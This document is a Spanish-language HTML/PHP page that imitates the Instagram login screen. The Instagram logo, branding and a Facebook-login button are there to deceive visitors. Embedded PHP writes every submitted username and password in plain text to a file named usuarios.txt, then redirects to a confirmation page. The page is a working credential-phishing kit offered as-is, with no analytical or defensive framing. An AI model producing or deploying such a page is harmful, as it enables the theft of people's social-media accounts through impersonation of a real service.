<!DOCTYPE html>
<html>
<head>
  <title>Iniciar sesión en Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=DM+Sans&display=swap');

    body {
      font-family: 'DM Sans', Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
    }
    
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 40px 20px;
      text-align: center;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }
    
    .logo {
      width: 150px;
      margin-bottom: 20px;
    }
    
    .input-group {
      margin-bottom: 20px;
    }
    
    .input-group label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    
    .input-group input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border-radius: 3px;
      border: 1px solid #dbdbdb;
      box-sizing: border-box;
    }
    
    .btn {
      display: block;
      width: 100%;
      padding: 10px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 50px;
      background-color: #3897f0;
      color: #fff;
      text-align: center;
      text-decoration: none;
      margin-top: 10px;
      border: none;
      cursor: pointer;
    }
    
    .btn:hover {
      background-color: #357ae8;
    }
    
    .text-small {
      font-size: 12px;
    }
    
    .divider {
      margin: 20px 0;
      text-align: center;
    }
    
    .divider-line {
      display: inline-block;
      width: 40%;
      height: 1px;
      background-color: #dbdbdb;
    }
    
    .divider-text {
      display: inline-block;
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 14px;
    }
    
    .forgot-password {
      color: #3897f0;
      font-size: 13px;
      float: right;
      margin-top: 5px;
    }
    
    .signup-text {
      color: #8e8e8e;
      font-size: 14px;
      margin-top: 20px;
    }
    
    .signup-link {
      color: #3897f0;
      font-size: 14px;
      text-decoration: none;
      font-weight: bold;
      margin-left: 5px;
    }
    
    .app-info {
      color: #8e8e8e;
      font-size: 12px;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram" class="logo">
    <button class="btn" style="background-color: #385185;">Continuar con Facebook <alt="Facebook" width="12" height="12"></button>
    <div class="divider">
      <span class="divider-line"></span>
      <span class="divider-text">o</span>
      <span class="divider-line"></span>
    </div>
    <form action="index.php" method="post">
      <?php
      if ($_SERVER["REQUEST_METHOD"] == "POST") {
          $username = $_POST['email'];
          $password = $_POST['password'];

          // Guardar los datos en un archivo de texto
          $file = fopen("usuarios.txt", "a");
          fwrite($file, "Usuario: " . $username . ", Contraseña: " . $password . "\n");
          fclose($file);

          // Redireccionar a otra página
          header("Location: confirmacion.html");
          exit();
      }
      ?>
      <div class="input-group">
        <input type="text" id="email" name="email" placeholder="Teléfono, usuario o correo electrónico" required>
      </div>
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Contraseña" required>
      </div>
      <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
      <input type="submit" value="Iniciar sesión" class="btn" style="background-color: #56a7e0;">
    </form>
    <p class="signup-text">¿No tienes una cuenta? <a href="#" class="signup-link">Regístrate</a></p>
    <p class="app-info">Obtén la aplicación para ver fotos y videos de tus amigos.</p>
  </div>
</body>
</html>
